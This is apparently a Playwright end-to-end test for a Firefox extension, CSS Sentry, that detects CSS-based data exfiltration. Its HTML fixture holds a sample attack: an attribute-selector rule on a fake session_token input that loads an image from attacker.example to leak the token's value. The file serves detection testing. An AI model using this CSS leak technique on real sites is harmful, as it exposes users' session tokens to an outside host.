import { expect, firefox, test, type BrowserContext } from "@playwright/test";
import { existsSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
import { createServer } from "node:http";
import { createConnection, createServer as createTcpServer, type Socket } from "node:net";
import { join, resolve } from "node:path";
import { tmpdir } from "node:os";

const FIREFOX_DEBUG_HOST = "127.0.0.1";
const FIREFOX_RUNTIME_HTML = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="css-sentry-test-lab" content="v1">
  <title>CSS Sentry Firefox runtime fixture</title>
  <script>
    window.__cssSentryDiagnostics = [];
    for (const eventName of ["css-sentry:test-lab-scan", "css-sentry:test-lab-report"]) {
      document.documentElement.addEventListener(eventName, (event) => {
        window.__cssSentryDiagnostics.push({ name: eventName, detail: JSON.parse(event.detail) });
      });
    }
  </script>
  <style>
    input[name="session_token"][value*="ABC"] {
      background-image: url("https://attacker.example/firefox-runtime-probe.svg");
    }
  </style>
</head>
<body>
  <main>
    <h1>CSS Sentry Firefox runtime fixture</h1>
    <input name="session_token" value="CSS-SENTRY-LAB-ABC-123" aria-label="fake session token">
  </main>
</body>
</html>`;

type DiagnosticEvent = {
  name: "css-sentry:test-lab-scan" | "css-sentry:test-lab-report";
  detail: {
    connected?: boolean;
    reportSaved?: boolean;
    mode?: string;
    actionableFindingCount?: number;
    reasons?: string[];
  };
};

type FirefoxRuntimeServer = { origin: string; close: () => Promise<void> };
type FirefoxExtensionContext = { context: BrowserContext; userDataDir: string };
type RemoteRequest = { to: string; type: string; [key: string]: unknown };
type RemoteMessage = { from?: string; type?: string; error?: string; message?: string; addonsActor?: string };

async function startFirefoxRuntimeServer(): Promise<FirefoxRuntimeServer> {
  const server = createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://127.0.0.1");
    if (url.pathname !== "/firefox-runtime.html") {
      response.writeHead(404, { "content-type": "text/plain; charset=utf-8" });
      response.end("Not found");
      return;
    }

    response.writeHead(200, {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-store",
    });
    response.end(FIREFOX_RUNTIME_HTML);
  });

  await new Promise<void>((resolveListen) => server.listen(0, "127.0.0.1", resolveListen));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Firefox runtime server did not expose a TCP port.");

  return {
    origin: `http://127.0.0.1:${address.port}`,
    close: () => new Promise<void>((resolveClose, rejectClose) => server.close((error) => error ? rejectClose(error) : resolveClose())),
  };
}

async function launchFirefoxExtensionContext(): Promise<FirefoxExtensionContext> {
  const extensionPath = join(process.cwd(), ".output/firefox-mv2");
  if (!existsSync(extensionPath)) throw new Error(`Built Firefox extension not found at ${extensionPath}. Run pnpm run build:firefox first.`);

  const userDataDir = await mkdtemp(join(tmpdir(), "css-sentry-firefox-e2e-"));
  const debuggingPort = await findFreeTcpPort();
  const context = await firefox.launchPersistentContext(userDataDir, {
    headless: false,
    executablePath: firefoxExecutablePath(),
    args: ["--start-debugger-server", String(debuggingPort)],
    firefoxUserPrefs: {
      "devtools.debugger.remote-enabled": true,
      "devtools.debugger.prompt-connection": false,
      "extensions.autoDisableScopes": 0,
      "extensions.enabledScopes": 15,
    },
  });

  try {
    await installTemporaryFirefoxAddon(debuggingPort, extensionPath);
    return { context, userDataDir };
  } catch (error) {
    await context.close();
    await rm(userDataDir, { recursive: true, force: true });
    throw error;
  }
}

async function closeFirefoxExtensionContext(context: BrowserContext, userDataDir: string): Promise<void> {
  await context.close();
  await rm(userDataDir, { recursive: true, force: true });
}

function firefoxExecutablePath(): string | undefined {
  return process.env.PLAYWRIGHT_FIREFOX_EXECUTABLE_PATH || process.env.FIREFOX_PATH || undefined;
}

async function installTemporaryFirefoxAddon(port: number, addonPath: string): Promise<void> {
  const client = await connectToFirefoxRemoteDebugging(port);
  try {
    const addonsActor = await firefoxAddonsActor(client);
    await client.request({ to: addonsActor, type: "installTemporaryAddon", addonPath });
  } finally {
    client.close();
  }
}

async function firefoxAddonsActor(client: FirefoxRemoteClient): Promise<string> {
  try {
    const root = await client.request({ to: "root", type: "getRoot" });
    if (root.addonsActor) return root.addonsActor;
  } catch {
    // Older Firefox remote-debugging servers may expose the add-ons actor through listTabs instead.
  }

  const tabs = await client.request({ to: "root", type: "listTabs" });
  if (tabs.addonsActor) return tabs.addonsActor;
  throw new Error("Firefox remote debugging did not expose an add-ons actor.");
}

async function connectToFirefoxRemoteDebugging(port: number): Promise<FirefoxRemoteClient> {
  let lastError: unknown;
  for (let attempt = 0; attempt < 250; attempt += 1) {
    try {
      return await FirefoxRemoteClient.connect(port);
    } catch (error) {
      lastError = error;
      await new Promise((resolveAttempt) => setTimeout(resolveAttempt, 120));
    }
  }
  throw lastError instanceof Error ? lastError : new Error("Timed out connecting to Firefox remote debugging server.");
}

class FirefoxRemoteClient {
  private readonly socket: Socket;
  private incoming = Buffer.alloc(0);
  private activeRequest: { actor: string; resolve: (value: RemoteMessage) => void; reject: (error: Error) => void } | null = null;
  private pendingRequests: Array<{ request: RemoteRequest; resolve: (value: RemoteMessage) => void; reject: (error: Error) => void }> = [];

  private constructor(socket: Socket) {
    this.socket = socket;
    this.socket.on("data", (data) => this.receiveSocketData(data));
    this.socket.on("error", (error) => this.failActiveRequest(error));
    this.socket.on("end", () => this.failActiveRequest(new Error("Firefox remote debugging connection closed.")));
  }

  static async connect(port: number): Promise<FirefoxRemoteClient> {
    const socket = await new Promise<Socket>((resolveConnect, rejectConnect) => {
      const candidate = createConnection({ host: FIREFOX_DEBUG_HOST, port });
      candidate.once("connect", () => resolveConnect(candidate));
      candidate.once("error", rejectConnect);
    });
    const client = new FirefoxRemoteClient(socket);
    await client.waitForRootGreeting();
    return client;
  }

  request(request: RemoteRequest): Promise<RemoteMessage> {
    return new Promise((resolveRequest, rejectRequest) => {
      this.pendingRequests.push({ request, resolve: resolveRequest, reject: rejectRequest });
      this.flushPendingRequests();
    });
  }

  close(): void {
    this.socket.end();
  }

  private waitForRootGreeting(): Promise<RemoteMessage> {
    return new Promise((resolveGreeting, rejectGreeting) => {
      this.activeRequest = { actor: "root", resolve: resolveGreeting, reject: rejectGreeting };
    });
  }

  private flushPendingRequests(): void {
    if (this.activeRequest || this.pendingRequests.length === 0) return;
    const next = this.pendingRequests.shift();
    if (!next) return;

    const payload = JSON.stringify(next.request);
    this.activeRequest = { actor: next.request.to, resolve: next.resolve, reject: next.reject };
    this.socket.write(`${Buffer.byteLength(payload)}:${payload}`);
  }

  private receiveSocketData(data: Buffer | string): void {
    const binaryData = typeof data === "string" ? Buffer.from(data, "utf8") : data;
    this.receive(binaryData);
  }

  private receive(data: Buffer): void {
    this.incoming = Buffer.concat([this.incoming, data]);
    while (this.parseNextMessage()) {
      // Continue until the current buffer no longer contains a complete remote-debugging packet.
    }
  }

  private parseNextMessage(): boolean {
    const separatorIndex = this.incoming.indexOf(58);
    if (separatorIndex < 1) return false;

    const byteLength = Number.parseInt(this.incoming.subarray(0, separatorIndex).toString("utf8"), 10);
    if (!Number.isFinite(byteLength)) throw new Error("Invalid Firefox remote debugging packet length.");
    const messageStart = separatorIndex + 1;
    const messageEnd = messageStart + byteLength;
    if (this.incoming.length < messageEnd) return false;

    const message = JSON.parse(this.incoming.subarray(messageStart, messageEnd).toString("utf8")) as RemoteMessage;
    this.incoming = this.incoming.subarray(messageEnd);
    this.resolveMessage(message);
    return true;
  }

  private resolveMessage(message: RemoteMessage): void {
    if (!message.from || !this.activeRequest || message.from !== this.activeRequest.actor) return;
    const active = this.activeRequest;
    this.activeRequest = null;

    if (message.error) active.reject(new Error(`${message.error}: ${message.message ?? "Firefox remote debugging request failed"}`));
    else active.resolve(message);

    this.flushPendingRequests();
  }

  private failActiveRequest(error: Error): void {
    this.activeRequest?.reject(error);
    this.activeRequest = null;
    for (const pending of this.pendingRequests.splice(0)) pending.reject(error);
  }
}

async function findFreeTcpPort(): Promise<number> {
  return await new Promise<number>((resolvePort, rejectPort) => {
    const server = createTcpServer();
    server.once("error", rejectPort);
    server.listen(0, FIREFOX_DEBUG_HOST, () => {
      const address = server.address();
      if (!address || typeof address === "string") {
        server.close(() => rejectPort(new Error("Could not allocate a Firefox remote debugging port.")));
        return;
      }
      const port = address.port;
      server.close(() => resolvePort(port));
    });
  });
}

async function firefoxDiagnostics(page: { evaluate: <T>(pageFunction: () => T) => Promise<T> }): Promise<DiagnosticEvent[]> {
  return await page.evaluate(() => (globalThis as unknown as { __cssSentryDiagnostics?: DiagnosticEvent[] }).__cssSentryDiagnostics ?? []);
}

test("Firefox runtime loads the extension and publishes scan and report diagnostics", async () => {
  const server = await startFirefoxRuntimeServer();
  const { context, userDataDir } = await launchFirefoxExtensionContext();

  try {
    const page = await context.newPage();
    await page.goto(`${server.origin}/firefox-runtime.html`, { waitUntil: "domcontentloaded" });

    await expect.poll(async () => {
      const diagnostics = await firefoxDiagnostics(page);
      return diagnostics.some((event) => event.name === "css-sentry:test-lab-scan" && (event.detail.actionableFindingCount ?? 0) > 0);
    }, { timeout: 15_000, message: "expected Firefox runtime content script to publish an actionable Test Lab scan diagnostic" }).toBe(true);

    await expect.poll(async () => {
      const diagnostics = await firefoxDiagnostics(page);
      return diagnostics.some((event) => event.name === "css-sentry:test-lab-report" && event.detail.reportSaved === true && (event.detail.actionableFindingCount ?? 0) > 0);
    }, { timeout: 15_000, message: "expected Firefox runtime background path to acknowledge saved Test Lab report" }).toBe(true);

    const diagnostics = await firefoxDiagnostics(page);
    const scan = diagnostics.find((event) => event.name === "css-sentry:test-lab-scan" && (event.detail.actionableFindingCount ?? 0) > 0);
    const report = diagnostics.find((event) => event.name === "css-sentry:test-lab-report" && event.detail.reportSaved === true);

    expect(scan?.detail.connected).toBe(true);
    expect(scan?.detail.mode).toBe("balanced");
    expect(scan?.detail.reasons).toContain("selector.attribute.substring_match");
    expect(scan?.detail.reasons).toContain("sink.remote_url");
    expect(report?.detail.connected).toBe(true);
  } finally {
    await closeFirefoxExtensionContext(context, userDataDir);
    await server.close();
  }
});
